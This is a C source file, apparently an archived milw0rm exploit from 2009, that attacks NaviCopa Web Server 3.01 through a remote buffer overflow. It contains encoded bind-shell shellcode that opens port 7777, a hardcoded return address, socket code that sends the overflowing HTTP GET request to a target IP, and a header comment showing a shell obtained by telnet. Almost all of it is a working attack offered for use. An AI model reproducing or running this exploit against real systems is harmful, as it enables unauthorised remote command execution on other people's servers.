/* navicpnt_xp1.c
*  NaviCopa Web Server 3.01 Remote Buffer Overflow Exploit
*  Cresit : http://milw0rm.com/exploits/7966  >> Thanks To: e.wiZz!
*
*  Coded by : SimO-s0fT >> Madridista ;)
*  E-mail : Overflows[at]Hotmail[dot]com
*  Tested on Windows XP SP2 Francais , Win2k SP4 english
*  Example :
           C:\Documents and Settings\Simo>navicpnt_xp1.exe  196.217.213.25
*  ________________________________________________________________________________
*
*        NaviCopa 3.01 Remote Buffer Overflow Exploit
*        Coded By : SimO-s0fT [overflows@hotmail.com ]
*
* ____________________________________________________________________________
*
* [+] Connection established
* [+] Sending data... [Done]
*
* C:\Documents and Settings\Simo>telnet 196.217.213.25 7777
* Microsoft Windows XP [version 5.1.2600]
* (C) Copyright 1985-2001 Microsoft Corp.
*
* Peace out
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#ifdef WIN32
#include <winsock2.h>
#pragma comment(lib, "ws2_32")
#else
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#define SOCKET int
#define closesocket(s) close(s)
#endif

/* Bind Shell open port 7777 */
char scode[]=
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x37\x49\x49\x49\x49\x49\x49\x49\x49\x51\x5a\x6a\x61"
"\x58\x30\x42\x31\x50\x42\x41\x6b\x41\x41\x71\x32\x41\x42\x41\x32"
"\x42\x41\x30\x42\x41\x58\x38\x41\x42\x50\x75\x6d\x39\x4b\x4c\x32"
"\x4a\x5a\x4b\x50\x4d\x6d\x38\x6b\x49\x49\x6f\x59\x6f\x39\x6f\x35"
"\x30\x6c\x4b\x70\x6c\x65\x74\x37\x54\x4c\x4b\x42\x65\x47\x4c\x6e"
"\x6b\x31\x6c\x46\x65\x33\x48\x43\x31\x48\x6f\x6c\x4b\x70\x4f\x65"
"\x48\x6c\x4b\x73\x6f\x35\x70\x37\x71\x38\x6b\x31\x59\x4c\x4b\x46"
"\x54\x6e\x6b\x53\x31\x58\x6e\x30\x31\x6f\x30\x4f\x69\x4e\x4c\x4b"
"\x34\x49\x50\x41\x64\x46\x67\x49\x51\x7a\x6a\x46\x6d\x43\x31\x48"
"\x42\x5a\x4b\x38\x74\x47\x4b\x30\x54\x64\x64\x51\x38\x42\x55\x4b"
"\x55\x4e\x6b\x53\x6f\x51\x34\x43\x31\x4a\x4b\x50\x66\x4e\x6b\x46"
"\x6c\x42\x6b\x4c\x4b\x73\x6f\x75\x4c\x33\x31\x5a\x4b\x65\x53\x34"
"\x6c\x6e\x6b\x6d\x59\x30\x6c\x57\x54\x55\x4c\x55\x31\x4b\x73\x74"
"\x71\x69\x4b\x65\x34\x6e\x6b\x43\x73\x74\x70\x6c\x4b\x67\x30\x46"
"\x6c\x6c\x4b\x70\x70\x67\x6c\x6e\x4d\x6c\x4b\x57\x30\x44\x48\x71"
"\x4e\x72\x48\x4e\x6e\x50\x4e\x54\x4e\x38\x6c\x70\x50\x4b\x4f\x4e"
"\x36\x71\x76\x41\x43\x31\x76\x31\x78\x76\x53\x30\x32\x53\x58\x30"
"\x77\x44\x33\x57\x42\x63\x6f\x70\x54\x6b\x4f\x48\x50\x73\x58\x58"
"\x4b\x58\x6d\x6b\x4c\x57\x4b\x70\x50\x6b\x4f\x6a\x76\x71\x4f\x6d"
"\x59\x4b\x55\x65\x36\x6c\x41\x68\x6d\x53\x38\x63\x32\x42\x75\x51"
"\x7a\x36\x62\x59\x6f\x58\x50\x71\x78\x4a\x79\x34\x49\x4b\x45\x6e"
"\x4d\x30\x57\x69\x6f\x4e\x36\x52\x73\x41\x43\x62\x73\x76\x33\x51"
"\x43\x70\x43\x43\x63\x73\x73\x36\x33\x6b\x4f\x4a\x70\x75\x36\x41"
"\x78\x75\x4e\x71\x71\x35\x36\x42\x73\x4b\x39\x79\x71\x6c\x55\x70"
"\x68\x4f\x54\x75\x4a\x32\x50\x39\x57\x52\x77\x69\x6f\x38\x56\x70"
"\x6a\x72\x30\x50\x51\x53\x65\x4b\x4f\x58\x50\x55\x38\x6c\x64\x4c"
"\x6d\x34\x6e\x49\x79\x66\x37\x6b\x4f\x4e\x36\x50\x53\x30\x55\x69"
"\x6f\x4a\x70\x53\x58\x7a\x45\x41\x59\x4e\x66\x37\x39\x36\x37\x69"
"\x6f\x59\x46\x72\x70\x50\x54\x31\x44\x33\x65\x4b\x4f\x5a\x70\x4f"
"\x63\x51\x78\x38\x67\x50\x79\x38\x46\x43\x49\x32\x77\x4b\x4f\x4b"
"\x66\x62\x75\x79\x6f\x6a\x70\x45\x36\x30\x6a\x52\x44\x30\x66\x41"
"\x78\x32\x43\x72\x4d\x6f\x79\x6d\x35\x62\x4a\x42\x70\x70\x59\x74"
"\x69\x5a\x6c\x6c\x49\x6b\x57\x41\x7a\x32\x64\x6b\x39\x68\x62\x30"
"\x31\x6f\x30\x6b\x43\x6e\x4a\x6b\x4e\x51\x52\x34\x6d\x49\x6e\x62"
"\x62\x36\x4c\x5a\x33\x6c\x4d\x71\x6a\x65\x68\x6e\x4b\x4c\x6b\x4e"
"\x4b\x55\x38\x30\x72\x59\x6e\x4c\x73\x37\x66\x4b\x4f\x30\x75\x63"
"\x74\x39\x6f\x6e\x36\x33\x6b\x36\x37\x72\x72\x31\x41\x31\x41\x46"
"\x31\x50\x6a\x55\x51\x31\x41\x41\x41\x32\x75\x42\x71\x39\x6f\x48"
"\x50\x50\x68\x6c\x6d\x39\x49\x45\x55\x78\x4e\x30\x53\x39\x6f\x6b"
"\x66\x62\x4a\x79\x6f\x39\x6f\x47\x47\x39\x6f\x58\x50\x4e\x6b\x50"
"\x57\x4b\x4c\x6c\x43\x4b\x74\x70\x64\x6b\x4f\x6a\x76\x41\x42\x49"
"\x6f\x58\x50\x30\x68\x68\x6f\x6a\x6e\x4b\x50\x31\x70\x42\x73\x49"
"\x6f\x58\x56\x49\x6f\x78\x50\x61";


#define OFFSET    232
#define NOP    0x90


int main(int argc, char *argv[]){
    SOCKET s;
    char *buffer;
    struct sockaddr_in their_addr;
    WSADATA wsa;
    char cmd_1[]="GET ";
    char cmd_2[]=" HTTP/1.1\r\n\r\n\x00";
    char Nop[40];
    int i=0;
    int ret_addr=0x7c9d2643;
    
    system("CLS");
    fprintf(stdout,"_________________________________________________________________________________________________________________\n\n");
    fprintf(stdout,"\t NaviCopa Web Server  3.01 Remote Buffer Overflow Exploit \n\t Coded By : SimO-s0fT [overflows@hotmail.com ]\n\n");
    fprintf(stdout,"_________________________________________________________________________________________________________________\n\n");
    
    if(argc!=2){
                printf("USAGE : %s [IP ADDRESSE]\n",argv[0]);
                printf("Example: navicpnt_xp1.exe  196.217.213.25\n");
                }
    if(WSAStartup(MAKEWORD(2, 0), &wsa) ==0){
        if((s =socket(AF_INET ,SOCK_STREAM, IPPROTO_TCP)) !=-1){
            
            their_addr.sin_family = AF_INET;
            their_addr.sin_addr.s_addr = inet_addr(argv[1]);
            their_addr.sin_port = htons(80);
    
    if(connect (s , (struct sockaddr *)&their_addr, sizeof(struct sockaddr)) !=-1){
        printf("[+] Connection established\n");
        
    
    buffer = (char*) malloc (4 + OFFSET +4+strlen(scode)+ strlen(cmd_2)+strlen(Nop));
    memset(buffer,0x41, 4 + OFFSET + 4+strlen(scode)+ strlen(cmd_2)+strlen(Nop));
    
    memcpy(buffer,cmd_1,4);                      
    i=4;
    
    i=0; i=OFFSET;
    
    memcpy(buffer+i,&ret_addr,4);            
    i+=4;
    
    memset(buffer+i,0x90,strlen(Nop));
    i+=40;
    memcpy(buffer+i,scode,strlen(scode));
    i+=strlen(scode);
    
    memcpy(buffer+i,cmd_2,strlen(cmd_2));
    i+=strlen(cmd_2);
    
    
    if(send(s,buffer,strlen(buffer), 0) !=-1){
        printf("[+] Sending data... ");
        printf("[Done]\n");
                        } else printf("[-] Send error\n");
                    
                } else printf("[-]Connect error \n");
                
          } else printf("[-]Socket error \n");
            
    } else printf("[-] WSAStartup error\n");

  closesocket(s);
  WSACleanup();
  free(buffer);
return 0;
}

// milw0rm.com [2009-08-24]
